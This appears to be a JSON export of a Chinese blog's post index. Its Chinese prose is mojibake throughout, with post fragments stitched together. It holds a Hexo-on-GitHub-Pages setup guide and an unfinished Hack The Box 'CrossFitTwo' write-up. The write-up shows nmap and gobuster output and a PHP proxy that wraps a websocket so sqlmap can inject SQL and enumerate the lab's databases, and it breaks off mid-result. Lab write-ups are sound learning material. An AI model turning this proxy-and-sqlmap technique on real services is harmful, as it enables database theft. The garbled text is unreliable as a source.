æ­å»ºåšå®¢ï¼Œé¦–å…ˆå’±ä»¬è‚¯å®šå¾—éœ€è¦ä¸ª Github è´¦å·å§ï¼Ÿæ•™äººæ•™åˆ°åº•ï¼Œå’±ä»¬å…ˆå»æ³¨å†Œä¸ªè´¦å·\n\n![image-20230613134332793](Hexo-GitHub-Indigoä¸»é¢˜æ­å»ºåšå®¢è¸©å‘æ—¥è®°/image-20230613134332793.png)\n\nç‚¹ `Sign up` æ³¨å†Œ\n\n![image-20230613134435619](Hexo-GitHub-Indigoä¸»é¢˜æ­å»ºåšå®¢è¸©å‘æ—¥è®°/image-20230613134435619.png)\n\nè¾“å…¥æ³¨å†Œçš„é‚®ç®±\n\n![image-20230613134558740](Hexo-GitHub-Indigoä¸»é¢˜æ­å»ºåšå®¢è¸©å‘æ—¥è®°/image-20230613134558740.png)\n\nè¾“å…¥è´¦å·å¯†ç åæ³¨å†Œå³å¯\n\nç„¶åä¼šå‘é‚®ç®±å‘é€ä¸€å°é‚®ä»¶ï¼Œé‡Œé¢ä¸€ä¸ªéªŒè¯ç ï¼Œè¾“å…¥åå³å¯æ³¨å†Œ\n\n![image-20230613134914883](Hexo-GitHub-Indigoä¸»é¢˜æ­å»ºåšå®¢è¸©å‘æ—¥è®°/image-20230613134914883.png)\n\næ³¨å†Œå¹¶ç™»å½•åçœ‹åˆ°çš„åº”è¯¥æ˜¯è¿™ç§ç•Œé¢ï¼Œå› ä¸ºæˆ‘çš„è´¦å·ä½¿ç”¨äº†å¾ˆä¹…äº†ï¼Œæ‰€ä»¥è¿™é‡Œæœ‰ä¸€äº›ä¸œè¥¿ï¼Œæˆ‘å°±æ‰“ä¸ªé©¬èµ›å…‹äº†\n\n### åˆ›å»ºä¸ªäººä»“åº“\n\n![image-20230613135146115](Hexo-GitHub-Indigoä¸»é¢˜æ­å»ºåšå®¢è¸©å‘æ—¥è®°/image-20230613135146115.png)\n\nç‚¹å‡» `New repository` åˆ›å»ºä¸€ä¸ªæ–°çš„ä»“åº“\n\n![image-20230613135332050](Hexo-GitHub-Indigoä¸»é¢˜æ­å»ºåšå®¢è¸©å‘æ—¥è®°/image-20230613135332050.png)\n\nè¿™é‡Œçš„ä»“åº“åæ˜¯ `xxx.github.io`ï¼Œå…¶ä¸­ xxx æ˜¯ä½ çš„ä»“åº“åï¼Œæ¯”å¦‚æˆ‘çš„å°±æ˜¯ LucifielHackã€‚\n\nå¿…é¡»å¾—æŒ‰ç…§è¿™ä¸ªæ ¼å¼è®¾ç½®ï¼Œå¦åˆ™æ˜¯æ— æ³•è§£æçš„\n\n![image-20230613135510893](Hexo-GitHub-Indigoä¸»é¢˜æ­å»ºåšå®¢è¸©å‘æ—¥è®°/image-20230613135510893.png)\n\nç‚¹å‡»åˆ›å»ºåï¼Œä¼šè¿›å…¥è¿™ä¸ªç•Œé¢ï¼Œè¿™ä¹Ÿæ˜¯åœ¨å‘Šè¯‰æˆ‘ä»¬å¦‚ä½•è®¾ç½®\n\n### ç”Ÿæˆ SSH æ·»åŠ åˆ° Github\n\nç”Ÿæˆ `SSH` æ·»åŠ åˆ° `Github` ï¼Œè¿æ¥ `Github` ä¸æœ¬åœ°\n\nå³é”®æ¡Œé¢æ‰“å¼€ `Git Bash` ï¼Œç„¶åè¾“å…¥ä¸‹é¢çš„å‘½ä»¤ï¼š\n\n```\ngit config --global user.name \"yourname\"\ngit config --global user.email \"youremail\"\n```\n\næ³¨æ„ï¼šç¬¬ä¸€æ¬¡ä½¿ç”¨ `git` åéœ€è¦å°†ç”¨æˆ·åå’Œé‚®ç®±è¿›è¡Œåˆå§‹åŒ–\n\nè¿™é‡Œçš„ name å’Œ email åˆ†åˆ«æ˜¯ Github çš„ç”¨æˆ·åå’Œé‚®ç®±ï¼Œæ ¹æ®è‡ªå·±çš„æ³¨å†Œä¿¡æ¯å¡«å†™å°±å¯ä»¥äº†\n\n```\ngit config user.name\ngit config user.email\n```\n\nå¯ä»¥ç”¨ä¸Šé¢ä¸¤æ¡å‘½ä»¤ç¡®è®¤è‡ªå·±æ˜¯å¦è¾“å…¥æ­£ç¡®\n\nç„¶ååˆ›å»º `SSH`ï¼Œä¸€è·¯å›è½¦å³å¯\n\n```\nssh-keygen -t rsa -C \"youremail\"\n```\n\n> `ssh`ï¼Œç®€å•æ¥è®²ï¼Œå°±æ˜¯ä¸€ä¸ªç§˜é’¥ï¼Œå…¶ä¸­ï¼Œ`id_rsa`æ˜¯ä½ è¿™å°ç”µè„‘çš„ç§äººç§˜é’¥ï¼Œä¸èƒ½ç»™åˆ«äººçœ‹çš„ï¼Œ`id_rsa.pub`æ˜¯å…¬å…±ç§˜é’¥ï¼Œå¯ä»¥éšä¾¿ç»™åˆ«äººçœ‹ã€‚æŠŠè¿™ä¸ªå…¬é’¥æ”¾åœ¨`GitHub`ä¸Šï¼Œè¿™æ ·å½“ä½ é“¾æ¥`GitHub`è‡ªå·±çš„è´¦æˆ·æ—¶ï¼Œå®ƒå°±ä¼šæ ¹æ®å…¬é’¥åŒ¹é…ä½ çš„ç§é’¥ï¼Œå½“èƒ½å¤Ÿç›¸äº’åŒ¹é…æ—¶ï¼Œæ‰èƒ½å¤Ÿé¡ºåˆ©çš„é€šè¿‡`git`ä¸Šä¼ ä½ çš„æ–‡ä»¶åˆ°`GitHub`ä¸Šã€‚\n\nè¿™ä¸ªæ—¶å€™å®ƒä¼šå‘Šè¯‰ä½ å·²ç»ç”Ÿæˆäº†`.ssh`çš„æ–‡ä»¶å¤¹ã€‚åœ¨ä½ çš„ç”µè„‘ä¸­æ‰¾åˆ°è¿™ä¸ªæ–‡ä»¶å¤¹ã€‚æˆ–è€…`git bash`ä¸­è¾“å…¥\n\n```bash\ncat ~/.ssh/id_rsa.pub\n```\n\nå°† `id_rsa.pub` çš„å†…å®¹å¤åˆ¶å¥½\n\næŒ¨ä¸ªç‚¹å‡» Settings --> Deploy keys --> Add deploy key\n\n![image-20230613140353370](Hexo-GitHub-Indigoä¸»é¢˜æ­å»ºåšå®¢è¸©å‘æ—¥è®°/image-20230613140353370.png)\n\nç„¶ååå­—éšä¾¿å–ä¸€ä¸ªå°±è¡Œï¼ŒæŠŠ `id_rsa.pub` çš„å†…å®¹ç²˜è´´åˆ° Key ä¸­\n\nåœ¨ `git bash` ä¸­è¾“å…¥ `ssh -T git@github.com` ï¼Œå¦‚æœå‡ºç° `Hi xxx/xxx.github.io! You've successfully authenticated,but Github does not provide shell access.`å³ä¸ºè®¾ç½®æˆåŠŸ\n\n### å°† Hexo éƒ¨ç½²åˆ° Github\n\næ‰“å¼€åšå®¢æ ¹ç›®å½•ä¸‹çš„ `_config.yml` æ–‡ä»¶\n\n```\n# Deployment\n## Docs: https://hexo.io/docs/one-command-deployment\ndeploy:\n  type: ''\n```\n\nè¿™æ˜¯æœ€åä¸€éƒ¨åˆ†ï¼Œ102 è¡Œçš„å†…å®¹ï¼Œå°†å®ƒä¿®æ”¹ä¸º\n\n```\n# Deployment\n## Docs: https://hexo.io/docs/one-command-deployment\ndeploy:\n  type: git\n  repository: https://github.com/LucifielHack/LucifielHack.github.io\n  branch: master\n```\n\nå…¶ä¸­çš„ repository ä¿®æ”¹ä¸ºè‡ªå·±çš„ Github ä»“åº“åœ°å€å³å¯\n\nç„¶åéœ€è¦å®‰è£… `deploy-git` æ’ä»¶ï¼Œä¹Ÿå°±æ˜¯éƒ¨ç½²åˆ° Github çš„å‘½ä»¤ï¼Œè¿™æ ·æ‰å¯ä»¥ä½¿ç”¨å‘½ä»¤è¡Œéƒ¨ç½²åˆ° Github\n\n```\nnpm install hexo-deployer-git --save\n```\n\nç„¶å\n\n```\nhexo clean\nhexo g\nhexo d\n```\n\nå³å¯å‘å¸ƒåˆ° Github\n\nç„¶åç­‰å¾…å‡ åˆ†é’Ÿå³å¯æ›´æ–°æˆåŠŸ\n\næ¥ç€å» http://yourname.github.io è¿™ä¸ªç½‘ç«™å³å¯çœ‹åˆ°ä½ çš„åšå®¢\n\n### è®¾ç½®è‡ªå®šä¹‰åŸŸå\n\nå¤§å®¶å¦‚æœæœ‰è‡ªå·±çš„åŸŸåçš„è¯ï¼Œå¯ä»¥è®¾ç½®ç”¨è‡ªå·±çš„åŸŸåæ¥è§£æ\n\nç‚¹å‡» Settings --> Pages --> Custom domain\n\nå°† Custom domain ä¸­çš„åœ°å€è®¾ç½®ä¸ºè‡ªå·±çš„åŸŸå\n\n![image-20230613141725730](Hexo-GitHub-Indigoä¸»é¢˜æ­å»ºåšå®¢è¸©å‘æ—¥è®°/image-20230613141725730.png)\n\nç„¶åå»è‡ªå·±çš„åŸŸåå•†æ·»åŠ ä¸€æ¡è§£æè®°å½•\n\n![image-20230613141742481](Hexo-GitHub-Indigoä¸»é¢˜æ­å»ºåšå®¢è¸©å‘æ—¥è®°/image-20230613141742481.png)\n\nç„¶åå°±å¯ä»¥é€šè¿‡è‡ªå·±çš„åŸŸåè®¿é—®åˆ° Github æ­å»ºçš„ Hexo åšå®¢äº†\n","categories":["å­¦ä¹ è®°å½•"]},{"title":"MacBook M1 æ¸—é€æµ‹è¯•ç¯å¢ƒè¸©å‘æ—¥è®°","url":"/2023/05/20/å­¦ä¹ è®°å½•/MacBook-M1-æ¸—é€æµ‹è¯•ç¯å¢ƒè¸©å‘æ—¥è®°/","categories":["å­¦ä¹ è®°å½•"]},{"title":"CrossFitTwo - Hackthebox - è¿˜æ²¡åšå®Œ","url":"/2023/05/19/Hackthebox/Insane/Hackthebox-CrossFitTwoæœªå®Œæˆ/","content":"\n# Hackthebox - CrossFitTwoæœªå®Œæˆ\n## é¶åœºä¿¡æ¯\n![](Hackthebox-CrossFitTwoæœªå®Œæˆ/ae31d143-7961-452d-ba03-ad175fc3e335.png)\n\n## é¶åœºç±»å‹\n![](Hackthebox-CrossFitTwoæœªå®Œæˆ/0abbf8b1-25d8-407e-be87-a3eeb69757c1.png)\n\n## ä¿¡æ¯æœé›†\né¦–å…ˆä½¿ç”¨nmapè¿›è¡Œä¿¡æ¯æœé›†\n\n```Plain Text\nâ”Œâ”€â”€(rootğŸ’€root)-[~/Desktop]\nâ””â”€# nmap -A -sS -sC -sV -p- 10.10.10.232\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-07-28 20:35 CST\nWARNING: Service 10.10.10.232:80 had already soft-matched http, but now soft-matched rtsp; ignoring second value\nNmap scan report for 10.10.10.232\nHost is up (0.24s latency).\nNot shown: 65532 closed ports\nPORT     STATE SERVICE             VERSION\n22/tcp   open  ssh                 OpenSSH 8.4 (protocol 2.0)\n| ssh-hostkey:\n|   3072 35:0a:81:06:de:be:8c:d8:d7:27:66:db:96:94:fd:52 (RSA)\n|   256 94:60:55:35:9a:1a:a8:45:a1:ae:19:cd:61:05:ec:3f (ECDSA)\n|_  256 a2:c8:6b:6e:11:b6:70:69:db:d2:60:2e:2f:d1:2f:ab (ED25519)\n80/tcp   open  http                (PHP 7.4.12)\n| fingerprint-strings:\n|   GetRequest, HTTPOptions:\n|     HTTP/1.0 200 OK\n|     Connection: close\n|     Connection: close\n|     Content-type: text/html; charset=UTF-8\n|     Date: Wed, 28 Jul 2021 13:03:17 GMT\n|     Server: OpenBSD httpd\n|     X-Powered-By: PHP/7.4.12\n|     <!DOCTYPE html>\n|     <html lang=\"zxx\">\n|     <head>\n|     <meta charset=\"UTF-8\">\n|     <meta name=\"description\" content=\"Yoga StudioCrossFit\">\n|     <meta name=\"keywords\" content=\"Yoga, unica, creative, html\">\n|     <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n|     <meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\">\n|     <title>CrossFit</title>\n|     <!-- Google Font -->\n|     <link href=\"https://fonts.googleapis.com/css?family=PT+Sans:400,700&display=swap\" rel=\"stylesheet\">\n|     <link href=\"https://fonts.googleapis.com/css?family=Oswald:400,500,600,700&display=swap\" rel=\"stylesheet\">\n|     <!-- Css Styles -->\n|     <link rel=\"stylesheet\" href=\"css/bootstrap.min.css\" type=\"text/css\">\n|_    <link rel=\"styleshe\n|_http-server-header: OpenBSD httpd\n|_http-title: CrossFit\n8953/tcp open  ssl/ub-dns-control?\n| ssl-cert: Subject: commonName=unbound\n| Not valid before: 2021-01-11T07:01:10\n|_Not valid after:  2040-09-28T07:01:10\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\nSF-Port80-TCP:V=7.91%I=7%D=7/28%Time=610152AC%P=x86_64-pc-linux-gnu%r(GetR\nSF:equest,3541,\"HTTP/1\\.0\\x20200\\x20OK\\r\\nConnection:\\x20close\\r\\nConnecti\nSF:on:\\x20close\\r\\nContent-type:\\x20text/html;\\x20charset=UTF-8\\r\\nDate:\\x\nSF:20Wed,\\x2028\\x20Jul\\x202021\\x2013:03:17\\x20GMT\\r\\nServer:\\x20OpenBSD\\x2\nSF:0httpd\\r\\nX-Powered-By:\\x20PHP/7\\.4\\.12\\r\\n\\r\\n<!DOCTYPE\\x20html>\\n<htm\nSF:l\\x20lang=\\\"zxx\\\">\\n\\n<head>\\n\\x20\\x20\\x20\\x20<meta\\x20charset=\\\"UTF-8\\\nSF:\">\\n\\x20\\x20\\x20\\x20<meta\\x20name=\\\"description\\\"\\x20content=\\\"Yoga\\x20\nSF:StudioCrossFit\\\">\\n\\x20\\x20\\x20\\x20<meta\\x20name=\\\"keywords\\\"\\x20conten\nSF:t=\\\"Yoga,\\x20unica,\\x20creative,\\x20html\\\">\\n\\x20\\x20\\x20\\x20<meta\\x20n\nSF:ame=\\\"viewport\\\"\\x20content=\\\"width=device-width,\\x20initial-scale=1\\.0\nSF:\\\">\\n\\x20\\x20\\x20\\x20<meta\\x20http-equiv=\\\"X-UA-Compatible\\\"\\x20content\nSF:=\\\"ie=edge\\\">\\n\\x20\\x20\\x20\\x20<title>CrossFit</title>\\n\\n\\x20\\x20\\x20\\\nSF:x20<!--\\x20Google\\x20Font\\x20-->\\n\\x20\\x20\\x20\\x20<link\\x20href=\\\"https\nSF:://fonts\\.googleapis\\.com/css\\?family=PT\\+Sans:400,700&display=swap\\\"\\x\nSF:20rel=\\\"stylesheet\\\">\\n\\x20\\x20\\x20\\x20<link\\x20href=\\\"https://fonts\\.g\nSF:oogleapis\\.com/css\\?family=Oswald:400,500,600,700&display=swap\\\"\\x20rel\nSF:=\\\"stylesheet\\\">\\n\\n\\x20\\x20\\x20\\x20<!--\\x20Css\\x20Styles\\x20-->\\n\\x20\\\nSF:x20\\x20\\x20<link\\x20rel=\\\"stylesheet\\\"\\x20href=\\\"css/bootstrap\\.min\\.cs\nSF:s\\\"\\x20type=\\\"text/css\\\">\\n\\x20\\x20\\x20\\x20<link\\x20rel=\\\"styleshe\")%r(\nSF:HTTPOptions,1AFC,\"HTTP/1\\.0\\x20200\\x20OK\\r\\nConnection:\\x20close\\r\\nCon\nSF:nection:\\x20close\\r\\nContent-type:\\x20text/html;\\x20charset=UTF-8\\r\\nDa\nSF:te:\\x20Wed,\\x2028\\x20Jul\\x202021\\x2013:03:17\\x20GMT\\r\\nServer:\\x20OpenB\nSF:SD\\x20httpd\\r\\nX-Powered-By:\\x20PHP/7\\.4\\.12\\r\\n\\r\\n<!DOCTYPE\\x20html>\\\nSF:n<html\\x20lang=\\\"zxx\\\">\\n\\n<head>\\n\\x20\\x20\\x20\\x20<meta\\x20charset=\\\"U\nSF:TF-8\\\">\\n\\x20\\x20\\x20\\x20<meta\\x20name=\\\"description\\\"\\x20content=\\\"Yog\nSF:a\\x20StudioCrossFit\\\">\\n\\x20\\x20\\x20\\x20<meta\\x20name=\\\"keywords\\\"\\x20c\nSF:ontent=\\\"Yoga,\\x20unica,\\x20creative,\\x20html\\\">\\n\\x20\\x20\\x20\\x20<meta\nSF:\\x20name=\\\"viewport\\\"\\x20content=\\\"width=device-width,\\x20initial-scale\nSF:=1\\.0\\\">\\n\\x20\\x20\\x20\\x20<meta\\x20http-equiv=\\\"X-UA-Compatible\\\"\\x20co\nSF:ntent=\\\"ie=edge\\\">\\n\\x20\\x20\\x20\\x20<title>CrossFit</title>\\n\\n\\x20\\x20\nSF:\\x20\\x20<!--\\x20Google\\x20Font\\x20-->\\n\\x20\\x20\\x20\\x20<link\\x20href=\\\"\nSF:https://fonts\\.googleapis\\.com/css\\?family=PT\\+Sans:400,700&display=swa\nSF:p\\\"\\x20rel=\\\"stylesheet\\\">\\n\\x20\\x20\\x20\\x20<link\\x20href=\\\"https://fon\nSF:ts\\.googleapis\\.com/css\\?family=Oswald:400,500,600,700&display=swap\\\"\\x\nSF:20rel=\\\"stylesheet\\\">\\n\\n\\x20\\x20\\x20\\x20<!--\\x20Css\\x20Styles\\x20-->\\n\nSF:\\x20\\x20\\x20\\x20<link\\x20rel=\\\"stylesheet\\\"\\x20href=\\\"css/bootstrap\\.mi\nSF:n\\.css\\\"\\x20type=\\\"text/css\\\">\\n\\x20\\x20\\x20\\x20<link\\x20rel=\\\"styleshe\nSF:\");\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.91%E=4%D=7/28%OT=22%CT=1%CU=43404%PV=Y%DS=2%DC=T%G=Y%TM=610152E\nOS:6%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10B%TI=RD%CI=RI%II=RI%TS=22\nOS:)OPS(O1=M54DNNSNW6NNT11%O2=M54DNNSNW6NNT11%O3=M54DNW6NNT11%O4=M54DNNSNW6\nOS:NNT11%O5=M54DNNSNW6NNT11%O6=M54DNNSNNT11)WIN(W1=4000%W2=4000%W3=4000%W4=\nOS:4000%W5=4000%W6=4000)ECN(R=Y%DF=Y%T=40%W=4000%O=M54DNNSNW6%CC=N%Q=)T1(R=\nOS:Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A\nOS:%A=S%F=AR%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=\nOS:Y%DF=Y%T=40%W=0%S=A%A=S%F=AR%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=FF%IPL=38%U\nOS:N=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=S%T=FF%CD=S)\n\nNetwork Distance: 2 hops\n\nTRACEROUTE (using port 3306/tcp)\nHOP RTT       ADDRESS\n1   237.08 ms 10.10.14.1\n2   237.15 ms 10.10.10.232\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 989.11 seconds\n```\nä»ä¸Šé¢çš„æ‰«æç»“æœå’±ä»¬å¯ä»¥å¾—åˆ°çš„çº¿ç´¢æœ‰ - æœ¬å°é¶æœºå¼€å¯äº†`22`ï¼Œ`80`ï¼Œ`8953`ç«¯å£ - 80ç«¯å£ä¸ºhttpæœåŠ¡ - 8953ä¸ºsslæœåŠ¡\n\nå’±ä»¬å…ˆè¿›80ç«¯å£çœ‹çœ‹\n\n![](Hackthebox-CrossFitTwoæœªå®Œæˆ/38710e9f-4fce-4d05-a7b5-d03d4d3d6b36.png)\n\nå’±ä»¬å…ˆè¿›è¡Œç›®å½•è·¯å¾„fuzzå§\n\n```Plain Text\nâ”Œâ”€â”€(rootğŸ’€root)-[~/Desktop]\nâ””â”€# gobuster dir -u http://10.10.10.232 -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,txt -b 403,404\n===============================================================\nGobuster v3.1.0\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://10.10.10.232\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt\n[+] Negative Status codes:   403,404\n[+] User Agent:              gobuster/3.1.0\n[+] Extensions:              php,html,txt\n[+] Timeout:                 10s\n===============================================================\n2021/07/28 21:27:27 Starting gobuster in directory enumeration mode\n===============================================================\n/about-us.php         (Status: 200) [Size: 15733]\n/blog.php             (Status: 200) [Size: 15369]\n/classes.php          (Status: 200) [Size: 25946]\n/contact.php          (Status: 200) [Size: 8007]\n/css                  (Status: 301) [Size: 510] [--> http://10.10.10.232/css/]\n/elements.php         (Status: 200) [Size: 19654]\n/fonts                (Status: 301) [Size: 510] [--> http://10.10.10.232/fonts/]\n/images               (Status: 301) [Size: 510] [--> http://10.10.10.232/images/]\n/img                  (Status: 301) [Size: 510] [--> http://10.10.10.232/img/]\n/index.php            (Status: 200) [Size: 19041]\n/index.php            (Status: 200) [Size: 19041]\n/js                   (Status: 301) [Size: 510] [--> http://10.10.10.232/js/]\n/main.html            (Status: 200) [Size: 931]\n/readme.txt           (Status: 200) [Size: 410]\n/vendor               (Status: 301) [Size: 510] [--> http://10.10.10.232/vendor/]\n\n===============================================================\n2021/07/28 21:38:26 Finished\n===============================================================\n```\næ‰«æçš„åŒæ—¶ï¼Œåœ¨80ç«¯å£æ‰‹åŠ¨æ”¶é›†äº†ä¸€ä¸‹ä¿¡æ¯ã€‚ç‚¹å‡»`MEMBER AREA`ä¼šè·³è½¬åˆ°ä¸€ä¸ªåŸŸå`employees.crossfit.htb`ï¼Œä½†å’±ä»¬æœ¬åœ°æ²¡æœ‰æ·»åŠ è§£æï¼Œæ‰€ä»¥æˆ‘ä»¬ç»™å®ƒæ·»åŠ ä¸Š\n\n```Plain Text\necho 10.10.10.232 crossfit.htb employees.crossfit.htb >> /etc/hosts\n```\nç„¶åå°±å¯ä»¥è®¿é—®è¿™ä¸ªåŸŸåäº†\n\n![](Hackthebox-CrossFitTwoæœªå®Œæˆ/4ef554b5-95f2-4d81-bf0d-7f66c6b1e84c.png)\n\nè®¿é—®åå‘ç°æ˜¯ä¸€ä¸ªç™»å½•é¡µé¢ï¼Œæ‰‹åŠ¨æµ‹è¯•äº†å‡ ä¸ªå¼±å£ä»¤æ²¡æœ‰æˆåŠŸï¼Œå’±ä»¬ä¾ç„¶æŒ‚ä¸Šç›®å½•fuzzç„¶åå»è¿›è¡Œå…¶ä»–çš„æœé›†\n\n```Plain Text\nâ”Œâ”€â”€(rootğŸ’€root)-[~/Desktop]\nâ””â”€# gobuster dir -u http://employees.crossfit.htb/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,txt -t 100 -b 403,404\n===============================================================\nGobuster v3.1.0\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://employees.crossfit.htb/\n[+] Method:                  GET\n[+] Threads:                 100\n[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt\n[+] Negative Status codes:   403,404\n[+] User Agent:              gobuster/3.1.0\n[+] Extensions:              php,html,txt\n[+] Timeout:                 10s\n===============================================================\n2021/07/28 21:03:34 Starting gobuster in directory enumeration mode\n===============================================================\n/css                  (Status: 301) [Size: 510] [--> http://employees.crossfit.htb/css/]\n/index.php            (Status: 200) [Size: 4412]\n/index.php            (Status: 200) [Size: 4412]\n/js                   (Status: 301) [Size: 510] [--> http://employees.crossfit.htb/js/]\n/vendor               (Status: 301) [Size: 510] [--> http://employees.crossfit.htb/vendor/]\n\n===============================================================\n2021/07/28 21:04:42 Finished\n===============================================================\n```\n![](Hackthebox-CrossFitTwoæœªå®Œæˆ/0e5006fc-7981-4ce8-b73f-49b707e55f77.png)\n\næŸ¥çœ‹ä¸»é¡µçš„æµé‡ï¼Œè¿˜å¯ä»¥çœ‹åˆ°ä¸€ä¸ªåŸŸå\n\n```Plain Text\ngym.crossfit.htb\n```\nçš„\n\n```Plain Text\nwebsocket\n```\nï¼Œå’±ä»¬ä¹ŸåŠ å…¥åˆ°hostsé‡Œ\n\n```Plain Text\necho 10.10.10.232 gym.crossfit.htb >> /etc/hosts\n```\nè¯¥æ¡ä¿¡æ¯æ‰€åœ¨çš„jsæ–‡ä»¶\n\n```Plain Text\nhttp://10.10.10.232/js/ws.min.js\n\nfunction updateScroll() {\n  var e = document.getElementById('chats');\n  e.scrollTop = e.scrollHeight\n}\nvar token,\nws = new WebSocket('ws://gym.crossfit.htb/ws/'),\npingTimeout = setTimeout(() =>{\n  ws.close(),\n  $('.chat-main').remove()\n}, 31000);\nfunction check_availability(e) {\n  var s = new Object;\n  s.message = 'available',\n  s.params = String(e),\n  s.token = token,\n  ws.send(JSON.stringify(s))\n}\n$('.chat-content').slideUp(),\n$('.hide-chat-box').click(function () {\n  $('.chat-content').slideUp()\n}),\n$('.show-chat-box').click(function () {\n  $('.chat-content').slideDown(),\n  updateScroll()\n}),\n$('.close-chat-box').click(function () {\n  $('.chat-main').remove()\n}),\nws.onopen = function () {\n},\nws.onmessage = function (e) {\n  'ping' === e.data ? (ws.send('pong'), clearTimeout(pingTimeout)) : (response = JSON.parse(e.data), answer = response.message, answer.startsWith('Hello!') && $('#ws').show(), token = response.token, $('#chat-messages').append('<li class=\"receive-msg float-left mb-2\"><div class=\"receive-msg-desc float-left ml-2\"><p class=\"msg_display bg-white m-0 pt-1 pb-1 pl-2 pr-2 rounded\">' + answer + '</p></div></li>'), updateScroll())\n},\n$('#sendmsg').on('keypress', function (e) {\n  if (13 === e.which) {\n    $(this).attr('disabled', 'disabled');\n    var s = $('#sendmsg').val();\n    if ('' !== s) {\n      $('#chat-messages').append('<li class=\"send-msg float-right mb-2\"><p class=\"msg_display pt-1 pb-1 pl-2 pr-2 m-0 rounded\">' + s + '</p></li>');\n      var t = new Object;\n      t.message = s,\n      t.token = token,\n      ws.send(JSON.stringify(t)),\n      $('#sendmsg').val(''),\n      $(this).removeAttr('disabled'),\n      updateScroll()\n    }\n  }\n});\n```\n![](Hackthebox-CrossFitTwoæœªå®Œæˆ/d4078ca0-debc-4573-b9b8-7b555cd29d5e.png)\n\næ·»åŠ åå†è®¿é—®ä¸»é¡µï¼Œä¼šå‘ç°å³ä¸‹è§’å¤šäº†ä¸€ä¸ªèŠå¤©çª—ï¼Œå¤§çº¦30såä¼šæ¶ˆå¤±\n\n## æ¼æ´åˆ©ç”¨\næµ‹è¯•ä¸€ä¸‹Websockets\n\n```Plain Text\npython3 -m websockets ws://gym.crossfit.htb/ws/\n\n{\"status\":\"200\",\"message\":\"Hello! This is Arnold, your assistant. Type 'help' to see available commands.\",\"token\":\"c7be5b4a23c5c16da958ff6ff7bd2a9ba12870159010824f6018199ece5fd8eb\"}\n```\næˆ‘ä»¬ä¼šå‘ç°ï¼Œæ¯æ¬¡è¯·æ±‚çš„tokneå€¼éƒ½ä¸ä¸€æ ·\n\næˆ‘ä»¬è‡ªå·±å†™ä¸€ä¸ªwebsocket-client > å‚è€ƒè¿æ¥ https://amphp.org/websocket-client/\n\n```Plain Text\nwebsocket-client.php\n\n<?php\n\nrequire 'vendor/autoload.php';\n\nuse Amp\\Websocket\\Client;\n\nAmp\\Loop::run(function () {\n    $connection = yield Client\\connect('ws://gym.crossfit.htb/ws/');\n    $message = yield $connection->receive();\n    $payload = yield $message->buffer();\n    $token   = json_decode($payload, true)[\"token\"];\n    $check   = json_encode(array('message' => 'available', 'params' => $_GET['id'], 'token' => $token));\n    yield $connection->send($check);\n    $message = yield $connection->receive();\n    $payload = yield $message->buffer();\n    header(\"Content-Type: application/json\");\n    printf($payload);\n\n    $connection->close();\n});\n```\n```Plain Text\ncomposer require amphp/websocket-client\n\nphp -S 0.0.0.0:1234\n```\nå¼€å¯ä»¥åï¼Œä½¿ç”¨curlè·å–ä¸€ä¸‹æˆ‘ä»¬çš„websocket-client.phpæ–‡ä»¶çš„å†…å®¹çœ‹çœ‹\n\n```Plain Text\ncurl http://127.0.0.1:1234/websocket-client.php\n\nâ”Œâ”€â”€(rootğŸ’€root)-[~/Desktop]\nâ””â”€# curl http://127.0.0.1:1234/websocket-client.php\n{\"status\":\"200\",\"message\":\"I'm sorry, this membership plan is currently unavailable.\",\"token\":\"69fc8199b15d3b5b2cbdc79c85d1173d9907a85d0f711348c4bd0273338a3e92\",\"debug\":\"[id: null]\"}\n```\næç¤º`id:null`ï¼Œé‚£å’±ä»¬å°±ç»™å®ƒåŠ ä¸€ä¸ª`id`å‚æ•°\n\n```Plain Text\ncurl http://127.0.0.1:1234/websocket-client.php?id=1\n\nâ”Œâ”€â”€(rootğŸ’€root)-[~/Desktop]\nâ””â”€# curl http://127.0.0.1:1234/websocket-client.php?id=1\n{\"status\":\"200\",\"message\":\"Good news! This membership plan is available.\",\"token\":\"21968a22a2766f17daf66508929fcb0a0cd333bef79064b0cd90b10c165e096d\",\"debug\":\"[id: 1, name: 1-month]\"}\n```\nOKï¼Œè¿™æ¬¡æœ‰å‚æ•°äº†ï¼Œé‚£çœ‹åˆ°è¿™é‡Œå¤§å®¶èƒ½æƒ³åˆ°ä»€ä¹ˆå‘¢ï¼Ÿåæ­£æˆ‘æƒ³åˆ°äº†æ³¨å…¥ï¼Œè¯´å¹²å°±å¹²\n\n```Plain Text\nsqlmap -u http://127.0.0.1:1234/websocket-client.php?id=1 --batch --dbs\n\n[14:38:53] [INFO] fetching database names\navailable databases [1]:\n[*] information_schema\n```\nOKï¼Œç¡®å®šæ˜¯å¯ä»¥æ³¨å…¥çš„äº†ï¼Œå’±ä»¬ä¸€æ­¥æ­¥æ³¨å…¥ä¸‹å»\n\n```Plain Text\nsqlmap -u http://127.0.0.1:1234/websocket-client.php?id=1 --batch --technique=B --threads=10 --dbs\n\navailable databases [3]:\n[*] crossfit\n[*] employees\n[*] information_schema\n```\n```Plain Text\nsqlmap -u http://127.0.0.1:1234/websocket-client.php?id=1 --batch --technique=B --threads=10 -D employees --tables\n\nDatabase: employees\n[2 tables]\n+----------------+\n| 